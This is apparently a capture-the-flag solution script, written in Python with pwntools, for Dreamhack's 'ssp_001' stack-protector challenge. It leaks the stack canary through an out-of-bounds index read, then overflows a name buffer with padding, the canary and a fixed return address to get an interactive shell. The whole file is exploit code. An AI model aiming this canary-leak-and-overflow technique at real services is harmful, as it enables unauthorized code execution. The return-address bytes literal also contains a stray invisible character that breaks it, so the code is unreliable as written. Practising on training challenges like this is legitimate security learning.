# File name : ssp_001.py

from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 13160)

# Canary
canary = b''

p.recvuntil(b'[E]xit')
for i in range(131, 127, -1):
   p.sendlineafter(b'> ', 'P')
   p.sendlineafter(b'index : ', str(i))
   p.recvuntil(b'is : ')
   canary += p.recvn(2)

payload = b'\x90' * 64
payload += p32(int(canary, 16))
payload += b'\x90' * 8
payload += b'﻿\xb9\x86\x04\x08'

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', str(len(payload)))
p.sendlineafter(b'Name : ', payload)

p.interactive()
